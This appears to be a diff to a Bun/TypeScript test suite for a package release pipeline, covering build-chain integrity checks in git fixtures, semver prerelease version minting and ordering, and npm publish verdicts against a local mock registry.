+  test.each(["lib/index.js", "lib/pkg/index.js"])("an empty %s never reaches build", (file) => {
+    const fx = seedFixture();
+    write(fx.work, file, "");
     expect(() => advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha })).toThrow(
-      /does not carry a non-empty regular-file lib\/index\.js/,
+      `does not carry a non-empty regular-file ${file}`,
     );
     expect(remoteRef(fx, "refs/heads/build")).toBe("");
     expect(remoteRef(fx, "refs/tags/latest")).toBe("");
+  });
+
+  test("a build tip minted before the library rode along is built on, and the child carries it", () => {
+    const fx = seedFixture();
+    // The chain as the pipeline left it before lib/pkg/ was packaged: the
+    // seed's tree minus workflows plus the bundle alone, latest on it.
+    const legacy = plantBuild(
+      fx,
+      "build-legacy",
+      fx.seedSha,
+      ["build: by hand", `Source: ${fx.seedSha}`],
+      {
+        "lib/index.js": "packaged-bundle-bytes-0\n",
+      },
+    );
+    git(fx.work, "fetch", "--quiet", "origin", "refs/heads/build");
+    git(fx.work, "push", "--quiet", "--force", "origin", `${legacy}:refs/tags/latest`);
+    let result: ReturnType<typeof advanceBuild> | undefined;
+    const pushes = withPushPlans(fx, [], () => {
+      result = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha });
+    });
+    const tip = buildTip(fx);
+    expect(result).toEqual({ changed: true, buildSha: tip, latestSha: tip, reason: advanced(tip) });
+    expect(pushes).toEqual([appendOf(tip), latestOf(legacy, tip)]);
+    expect(parentOf(fx.origin, tip)).toBe(legacy);
+    expect(git(fx.origin, "diff", "--name-only", fx.mergeSha, tip)).toBe(PACKAGED_DIFF);
+    // A stale rerun of the legacy source's run under this pipeline builds
+    // lib/pkg/ the chain commit lacks: it stops rather than rewrite the chain.
+    const stale = checkoutOf(fx, "legacy-rerun", fx.seedSha, "packaged-bundle-bytes-0\n");
+    expect(() => advanceBuild({ cwd: stale, sourceSha: fx.seedSha })).toThrow(
+      new RegExp(
+        `refs/heads/build holds ${legacy}, which names ${fx.seedSha} as its source but its tree [0-9a-f]{40} is not the tree [0-9a-f]{40} this checkout's build of ${fx.seedSha} packages, so the two differ under lib/index.js and lib/pkg/`,
+      ),
+    );
+    expect(buildTip(fx)).toBe(tip);
+    expect(latestTag(fx)).toBe(tip);
+  });
+
+  test("a release tag on a chain commit without the library build fails the confirmation, whatever its bundle", () => {
+    const fx = seedFixture();
+    // A legacy-shaped chain commit for the merge commit: right source, right
+    // bundle bytes, no lib/pkg/; build's tip, tagged as the release.
+    const planted = plantBuild(
+      fx,
+      "build-legacy-release",
+      fx.mergeSha,
+      ["build: by hand", `Source: ${fx.mergeSha}`],
+      {
+        "lib/index.js": "packaged-bundle-bytes-1\n",
+      },
+    );
+    git(fx.work, "fetch", "--quiet", "origin", "refs/heads/build");
+    git(
+      fx.work,
+      "push",
+      "--quiet",
+      "origin",
+      `${planted}:refs/tags/v2.1.0`,
+      `${planted}:refs/tags/v2`,
+    );
+    expect(() =>
+      verifyPublishedRefs({
+        cwd: shallowChecker(fx, "verify-legacy"),
+        tag: "v2.1.0",
+        sourceSha: fx.mergeSha,
+      }),
+    ).toThrow(
+      `${planted} does not carry a non-empty regular-file lib/pkg/index.js (no entry); refusing to point a consumable ref at an unpackaged commit.`,
+    );
+    // The package rerun holds the tag to this checkout's whole build too.
+    expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
+      /carries \[lib\/index\.js\] under lib\/index\.js and lib\/pkg\/, while this build of [0-9a-f]{40} produced \[lib\/index\.js, lib\/pkg\/index\.d\.ts, lib\/pkg\/index\.js\]/,
+    );
   });
 
   test("a shallow checkout is refused before any verdict", () => {
     const fx = seedFixture();
     const dir = join(fx.root, "build-shallow");
     execFileSync("git", ["clone", "--quiet", "--depth", "1", `file://${fx.origin}`, dir]);
-    write(dir, "lib/index.js", "packaged-bundle-bytes-1\n");
+    writeBuild(dir, "packaged-bundle-bytes-1\n");
     expect(() => advanceBuild({ cwd: dir, sourceSha: fx.mergeSha })).toThrow(
       /needs the full history.*shallow/,
     );
@@ -2114,8 +2387,9 @@ describe("advanceBuild", () => {
     const from = clone(fx.root, fx.origin, "build-competitor");
     git(from, "checkout", "--quiet", fx.seedSha);
     stripWorkflows(from);
-    write(from, "lib/index.js", "competitor-bundle\n");
-    git(from, "add", "-f", "lib/index.js");
+    writeBuild(from, "competitor-bundle\n");
+    stageBuild(from);
+    stripPrepare(from);
     const tree = git(from, "write-tree");
     const shas: string[] = [];
     let first = "";
@@ -2269,8 +2543,9 @@ describe("advanceBuild", () => {
       const rival = clone(fx.root, fx.origin, "backfill");
       git(rival, "checkout", "--quiet", fx.mergeSha);
       stripWorkflows(rival);
-      write(rival, "lib/index.js", "packaged-bundle-bytes-1\n");
-      git(rival, "add", "-f", "lib/index.js");
+      writeBuild(rival, "packaged-bundle-bytes-1\n");
+      stageBuild(rival);
+      stripPrepare(rival);
       const rivalTree = git(rival, "write-tree");
       // The tree's objects must already sit in origin for the hook to commit them.
       const holder = git(rival, "commit-tree", rivalTree, "-p", fx.mergeSha, "-m", "holder");
@@ -2466,5 +2741,440 @@ describe("release tag shape", () => {
     ).toThrow(/not a vX\.Y\.Z release tag/);
     expect(remoteRef(fx, "refs/tags/v2.1-rc.0")).toBe("");
     expect(remoteRef(fx, "refs/heads/build")).toBe("");
+  });
+});
+
+/** The version grammar as semver.org states it: what npm holds a version to
+ * before it normalizes one (a bare all-digit identifier loses its leading zero). */
+const SEMVER =
+  /^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(?:-((?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\.(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\+([0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*))?$/;
+
+describe("prereleaseVersion", () => {
+  const sha = "b8df084c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a";
+  const minted: [string, string, string, string][] = [
+    ["2.0.0", "412", sha, "2.0.1-main.412.gb8df084"],
+    ["2.9.9", "7", sha, "2.9.10-main.7.gb8df084"],
+    ["0.0.0", "0", sha, "0.0.1-main.0.gb8df084"],
+    // The sha7 that would be rewritten to 123456 as a bare identifier.
+    ["2.0.0", "412", "0123456789abcdef0123456789abcdef01234567", "2.0.1-main.412.g0123456"],
+  ];
+  test.each(minted)("manifest %s at run %s of %s mints %s", (manifest, run, source, expected) => {
+    const version = prereleaseVersion(manifest, run, source);
+    expect(version).toBe(expected);
+    expect(version).toMatch(SEMVER);
+  });
+
+  const refusedInputs: [string, [string, string, string], RegExp][] = [
+    ["a manifest version with a pre-release", ["2.0.0-rc.1", "412", sha], /is not X\.Y\.Z/],
+    ["a manifest version missing its patch", ["2.0", "412", sha], /is not X\.Y\.Z/],
+    ["a run number with a leading zero", ["2.0.0", "0412", sha], /not a decimal integer/],
+    ["an empty run number", ["2.0.0", "", sha], /not a decimal integer/],
+    ["a short sha", ["2.0.0", "412", "b8df084"], /not a full commit sha/],
+    ["an upper-case sha", ["2.0.0", "412", sha.toUpperCase()], /not a full commit sha/],
+  ];
+  test.each(refusedInputs)("%s is refused", (_name, args, error) => {
+    expect(() => prereleaseVersion(...args)).toThrow(error);
+  });
+
+  test("the checkout's version names the manifest at HEAD and the source it was told, which HEAD must be", () => {
+    const fx = seedFixture();
+    expect(prereleaseVersionOf({ cwd: fx.work, sourceSha: fx.mergeSha, runNumber: "412" })).toBe(
+      `2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}`,
+    );
+    expect(() =>
+      prereleaseVersionOf({ cwd: fx.work, sourceSha: fx.seedSha, runNumber: "412" }),
+    ).toThrow(
+      `the checkout is at ${fx.mergeSha}, not the source commit ${fx.seedSha} whose build is published.`,
+    );
+  });
+
+  /** Run the script's subcommand under this bun as the workflow does: stdout,
+   * stderr, and status as they were. Asynchronous, so a registry served from
+   * this process can answer the child. */
+  async function subcommand(
+    cwd: string,
+    env: Record<string, string | undefined>,
+    ...args: string[]
+  ): Promise<{ stdout: string; stderr: string; status: number }> {
+    const script = join(import.meta.dir, "..", "..", ".github", "scripts", "release-pipeline.ts");
+    const child = Bun.spawn([process.execPath, script, ...args], {
+      cwd,
+      env: Object.fromEntries(
+        Object.entries({ ...process.env, ...env }).filter(([, v]) => v !== undefined),
+      ) as Record<string, string>,
+      stdin: "ignore",
+      stdout: "pipe",
+      stderr: "pipe",
+    });
+    const [stdout, stderr, status] = await Promise.all([
+      new Response(child.stdout).text(),
+      new Response(child.stderr).text(),
+      child.exited,
+    ]);
+    return { stdout, stderr, status };
+  }
+
+  test("the subcommand prints the version alone on stdout, and nothing there when it fails", async () => {
+    const fx = seedFixture();
+    expect(
+      await subcommand(
+        fx.work,
+        { GITHUB_SHA: fx.mergeSha, GITHUB_RUN_NUMBER: "412" },
+        "prerelease-version",
+      ),
+    ).toEqual({
+      stdout: `2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}\n`,
+      stderr: "",
+      status: 0,
+    });
+    const failed = await subcommand(
+      fx.work,
+      { GITHUB_SHA: fx.mergeSha, GITHUB_RUN_NUMBER: undefined },
+      "prerelease-version",
+    );
+    expect(failed).toEqual({
+      stdout: "",
+      stderr:
+        'release-pipeline prerelease-version: GITHUB_RUN_NUMBER is required for "prerelease-version"\n',
+      status: 1,
+    });
+  });
+
+  const sha7 = "b8df084";
+  const orderings: [string, string, "newer" | "same" | "older"][] = [
+    ["2.1.0", "2.0.9", "newer"],
+    ["2.0.1", "2.0.1-main.412.gb8df084", "newer"],
+    ["2.0.1-main.412.gb8df084", "2.0.1", "older"],
+    ["2.0.1-main.412.gb8df084", "2.1.0", "older"],
+    ["2.0.1-main.413.g0000000", "2.0.1-main.412.gffffff0", "newer"],
+    ["2.0.1-main.412.gb8df084", "2.0.1-main.412.gb8df084", "same"],
+    ["2.0.1-main.412.gb8df085", "2.0.1-main.412.gb8df084", "newer"],
+    ["2.0.10", "2.0.9", "newer"],
+  ];
+  test.each(orderings)("%s is %s than %s", (a, b, expected) => {
+    expect(versionOrder(a, b)).toBe(expected);
+  });
+
+  test("a version this pipeline never mints is refused, not ordered", () => {
+    expect(() => versionOrder("2.0.1-beta.1", "2.0.1")).toThrow(
+      /not a version this pipeline mints/,
+    );
+    expect(() => versionOrder("2.0.1", "2.0.1-main.412.b8df084")).toThrow(
+      /not a version this pipeline mints/,
+    );
+  });
+
+  const registry = (versions: string[], tags: Record<string, string>): Packument => ({
+    versions: Object.fromEntries(versions.map((v) => [v, {}])),
+    "dist-tags": tags,
+  });
+  const nextVerdicts: [string, string, Packument | null, PublishVerdict][] = [
+    [
+      "a package the registry has never seen",
+      `2.0.1-main.412.g${sha7}`,
+      null,
+      { publish: true, version: `2.0.1-main.412.g${sha7}` },
+    ],
+    [
+      "the first pre-release after a release",
+      `2.0.1-main.412.g${sha7}`,
+      registry(["2.0.0"], { latest: "2.0.0" }),
+      { publish: true, version: `2.0.1-main.412.g${sha7}` },
+    ],
+    [
+      "a later run",
+      `2.0.1-main.413.g${sha7}`,
+      registry(["2.0.0", "2.0.1-main.412.g1111111"], {
+        latest: "2.0.0",
+        next: "2.0.1-main.412.g1111111",
+      }),
+      { publish: true, version: `2.0.1-main.413.g${sha7}` },
+    ],
+    [
+      "the release merge's own run (next stays above the stable that follows)",
+      `2.1.1-main.500.g${sha7}`,
+      registry(["2.0.0", "2.0.1-main.412.g1111111"], {
+        latest: "2.0.0",
+        next: "2.0.1-main.412.g1111111",
+      }),
+      { publish: true, version: `2.1.1-main.500.g${sha7}` },
+    ],
+    [
+      "a rerun of a run that already published",
+      `2.0.1-main.412.g${sha7}`,
+      registry(["2.0.0", `2.0.1-main.412.g${sha7}`], {
+        latest: "2.0.0",
+        next: `2.0.1-main.412.g${sha7}`,
+      }),
+      {
+        publish: false,
+        version: `2.0.1-main.412.g${sha7}`,
+        reason: `2.0.1-main.412.g${sha7} is already on the registry`,
+      },
+    ],
+    [
+      "a retry of an old run after a newer run published",
+      `2.0.1-main.412.g${sha7}`,
+      registry(["2.0.0", "2.0.1-main.413.g2222222"], {
+        latest: "2.0.0",
+        next: "2.0.1-main.413.g2222222",
+      }),
+      {
+        publish: false,
+        version: `2.0.1-main.412.g${sha7}`,
+        reason: `the registry's next is 2.0.1-main.413.g2222222, not older than 2.0.1-main.412.g${sha7}, so this stale run publishes nothing (npm publish --tag next would move next back)`,
+      },
+    ],
+    [
+      "a retry of an old run after a release shipped",
+      `2.0.1-main.412.g${sha7}`,
+      registry(["2.0.0", "2.1.0"], { latest: "2.1.0" }),
+      {
+        publish: false,
+        version: `2.0.1-main.412.g${sha7}`,
+        reason: `the registry's latest is 2.1.0, not older than 2.0.1-main.412.g${sha7}, so this stale run publishes nothing (npm publish --tag next would move next back)`,
+      },
+    ],
+    [
+      "the first CI run after the hand bootstrap, whatever dist-tag the registry gave it",
+      `2.0.1-main.412.g${sha7}`,
+      registry(["2.0.1-main.0.g0000000"], {
+        latest: "2.0.1-main.0.g0000000",
+        next: "2.0.1-main.0.g0000000",
+      }),
+      { publish: true, version: `2.0.1-main.412.g${sha7}` },
+    ],
+  ];
+  test.each(nextVerdicts)("next: %s", (_name, version, packument, expected) => {
+    expect(nextPublishVerdict(version, packument)).toEqual(expected);
+  });
+
+  const stableVerdicts: [string, string, Packument | null, PublishVerdict][] = [
+    ["a package the registry has never seen", "2.1.0", null, { publish: true, version: "2.1.0" }],
+    [
+      "the release after the bootstrap pre-release",
+      "2.1.0",
+      registry(["2.0.1-main.0.g0000000"], {
+        latest: "2.0.1-main.0.g0000000",
+        next: "2.0.1-main.0.g0000000",
+      }),
+      { publish: true, version: "2.1.0" },
+    ],
+    [
+      "a newer release",
+      "2.1.0",
+      registry(["2.0.0", "2.0.1-main.412.g1111111"], {
+        latest: "2.0.0",
+        next: "2.0.1-main.412.g1111111",
+      }),
+      { publish: true, version: "2.1.0" },
+    ],
+    [
+      "a rerun of the release's job",
+      "2.1.0",
+      registry(["2.0.0", "2.1.0"], { latest: "2.1.0" }),
+      { publish: false, version: "2.1.0", reason: "2.1.0 is already on the registry" },
+    ],
+    [
+      "a release taking latest over from a bootstrap pre-release that sorts above it",
+      "2.1.0",
+      registry(["2.1.1-main.0.g0000000"], {
+        latest: "2.1.1-main.0.g0000000",
+        next: "2.1.1-main.0.g0000000",
+      }),
+      { publish: true, version: "2.1.0" },
+    ],
+    [
+      "a rerun of an older release's job after a newer release",
+      "2.1.0",
+      registry(["2.0.0", "2.2.0"], { latest: "2.2.0" }),
+      {
+        publish: false,
+        version: "2.1.0",
+        reason:
+          "the registry's latest is 2.2.0, newer than 2.1.0, so this rerun of an older release publishes nothing (npm publish would move latest back)",
+      },
+    ],
+  ];
+  test.each(stableVerdicts)("stable: %s", (_name, version, packument, expected) => {
+    expect(stablePublishVerdict(version, packument)).toEqual(expected);
+  });
+
+  test("stable: a built package.json that is not the tag's version stops before the registry is asked", async () => {
+    const fx = seedFixture();
+    const asked = await withRegistry({ status: 404 }, async (registry, requests) => {
+      await expect(
+        npmVerdict({
+          cwd: fx.work,
+          channel: "stable",
+          sourceSha: fx.mergeSha,
+          tag: "v2.2.0",
+          registry,
+        }),
+      ).rejects.toThrow(
+        "package.json at the release source is version 2.1.0, but the release tag is v2.2.0; refusing to publish a version this source did not release.",
+      );
+      return requests;
+    });
+    expect(asked).toEqual([]);
+  });
+
+  /** A registry serving one packument (or the status given) for the fixture's package, on a local port. */
+  function withRegistry<T>(
+    answer: { status: number; body?: unknown },
+    body: (url: string, requests: string[]) => Promise<T>,
+  ): Promise<T> {
+    const requests: string[] = [];
+    const server = Bun.serve({
+      port: 0,
+      fetch(request) {
+        requests.push(new URL(request.url).pathname);
+        return answer.body === undefined
+          ? new Response("", { status: answer.status })
+          : Response.json(answer.body, { status: answer.status });
+      },
+    });
+    return body(`http://127.0.0.1:${server.port}`, requests).finally(() => server.stop(true));
+  }
+
+  test("the verdict reads the registry's record of the package named in package.json, and 404 is an unpublished package", async () => {
+    const fx = seedFixture();
+    const verdict = await withRegistry({ status: 404 }, async (registry, requests) => {
+      const result = await npmVerdict({
+        cwd: fx.work,
+        channel: "next",
+        sourceSha: fx.mergeSha,
+        runNumber: "412",
+        registry,
+      });
+      return { result, requests };
+    });
+    expect(verdict).toEqual({
+      result: { publish: true, version: `2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}` },
+      requests: ["/@scope%2Fpkg"],
+    });
+  });
+
+  test("the verdict skips what the registry already holds on both channels", async () => {
+    const fx = seedFixture();
+    const held = { versions: { "2.1.0": {}, "2.2.0": {} }, "dist-tags": { latest: "2.2.0" } };
+    await withRegistry({ status: 200, body: held }, async (registry) => {
+      expect(
+        await npmVerdict({
+          cwd: fx.work,
+          channel: "stable",
+          sourceSha: fx.mergeSha,
+          tag: "v2.1.0",
+          registry,
+        }),
+      ).toEqual({
+        publish: false,
+        version: "2.1.0",
+        reason: "2.1.0 is already on the registry",
+      });
+      expect(
+        await npmVerdict({
+          cwd: fx.work,
+          channel: "next",
+          sourceSha: fx.mergeSha,
+          runNumber: "412",
+          registry,
+        }),
+      ).toEqual({
+        publish: false,
+        version: `2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}`,
+        reason: `the registry's latest is 2.2.0, not older than 2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}, so this stale run publishes nothing (npm publish --tag next would move next back)`,
+      });
+    });
+  });
+
+  const malformed: [string, unknown, RegExp | string][] = [
+    ["an empty object", {}, "is not a packument (an object with versions and dist-tags records)"],
+    ["an array", [], /is not a packument/],
+    ["versions as a list", { versions: ["2.1.0"], "dist-tags": {} }, /is not a packument/],
+    [
+      "a dist-tag naming a non-string",
+      { versions: {}, "dist-tags": { latest: 210 } },
+      /names dist-tag latest as 210, not a version/,
+    ],
+  ];
+  test.each(malformed)(
+    "a 200 body that is %s stops the verdict, not an empty registry",
+    async (_name, body, error) => {
+      const fx = seedFixture();
+      await withRegistry({ status: 200, body }, async (registry) => {
+        await expect(
+          npmVerdict({
+            cwd: fx.work,
+            channel: "stable",
+            sourceSha: fx.mergeSha,
+            tag: "v2.1.0",
+            registry,
+          }),
+        ).rejects.toThrow(error);
+      });
+    },
+  );
+
+  test("a registry that answers anything but 200 or 404 stops the verdict instead of publishing blind", async () => {
+    const fx = seedFixture();
+    await withRegistry({ status: 503 }, async (registry) => {
+      await expect(
+        npmVerdict({
+          cwd: fx.work,
+          channel: "stable",
+          sourceSha: fx.mergeSha,
+          tag: "v2.1.0",
+          registry,
+        }),
+      ).rejects.toThrow(
+        `the registry answered 503 for @scope/pkg (${registry}/@scope%2Fpkg); refusing to publish without knowing what it holds.`,
+      );
+    });
+  });
+
+  test("the npm-verdict subcommand prints publish or skip on stdout, and the channel is required", async () => {
+    const fx = seedFixture();
+    await withRegistry({ status: 404 }, async (registry) => {
+      expect(
+        await subcommand(
+          fx.work,
+          { GITHUB_SHA: fx.mergeSha, GITHUB_RUN_NUMBER: "412", NPM_REGISTRY_URL: registry },
+          "npm-verdict",
+          "next",
+        ),
+      ).toEqual({
+        stdout: `publish 2.1.1-main.412.g${fx.mergeSha.slice(0, 7)}\n`,
+        stderr: "",
+        status: 0,
+      });
+      expect(
+        await subcommand(
+          fx.work,
+          { GITHUB_SHA: fx.mergeSha, TAG: "v2.1.0", NPM_REGISTRY_URL: registry },
+          "npm-verdict",
+          "stable",
+        ),
+      ).toEqual({ stdout: "publish 2.1.0\n", stderr: "", status: 0 });
+    });
+    await withRegistry(
+      { status: 200, body: { versions: { "2.1.0": {} }, "dist-tags": { latest: "2.1.0" } } },
+      async (registry) => {
+        expect(
+          await subcommand(
+            fx.work,
+            { GITHUB_SHA: fx.mergeSha, TAG: "v2.1.0", NPM_REGISTRY_URL: registry },
+            "npm-verdict",
+            "stable",
+          ),
+        ).toEqual({ stdout: "skip 2.1.0 is already on the registry\n", stderr: "", status: 0 });
+      },
+    );
+    expect(await subcommand(fx.work, { GITHUB_SHA: fx.mergeSha }, "npm-verdict")).toEqual({
+      stdout: "",
+      stderr:
+        "release-pipeline npm-verdict: npm-verdict takes the channel, next or stable, not null\n",
+      status: 1,
+    });
   });
 });
